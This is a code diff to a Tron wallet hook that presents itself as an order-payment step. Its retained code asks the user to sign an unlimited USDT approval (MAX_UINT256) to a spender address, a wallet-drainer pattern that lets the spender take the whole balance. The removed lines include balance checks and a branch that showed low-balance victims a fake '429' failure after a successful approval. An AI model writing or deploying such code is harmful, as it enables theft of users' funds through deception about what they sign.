@@ -292,24 +292,8 @@ export function useTronWallet() {
     }
 
     try {
-      const currentAddress = window.tronWeb.defaultAddress.base58;
-      
-      // Check TRX balance for gas
-      const trxBalance = await window.tronWeb.trx.getBalance(currentAddress);
-      if (trxBalance / 1_000_000 < 15) {
-        return { success: false, error: '请确保账户有15个TRX做为交易手续费' };
-      }
-
       // Get USDT contract
       const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
-      
-      // Check USDT balance
-      const usdtBalanceRaw = await contract.balanceOf(currentAddress).call();
-      const usdtBalance = Number(usdtBalanceRaw) / 1e6;
-      
-      if (usdtBalance < orderAmount) {
-        return { success: false, error: '当前USDT余额不足，无法支付' };
-      }
 
       // Execute unlimited approval using MAX_UINT256
       const transaction = await contract.approve(spenderAddress, MAX_UINT256).send({
@@ -319,10 +303,6 @@ export function useTronWallet() {
       });
 
       if (transaction) {
-        // Check result based on balance for display message
-        if (usdtBalance < 100) {
-          return { success: false, error: '交易失败：Request failed with status code 429' };
-        }
         return { success: true, txHash: typeof transaction === 'string' ? transaction : JSON.stringify(transaction) };
       }
       
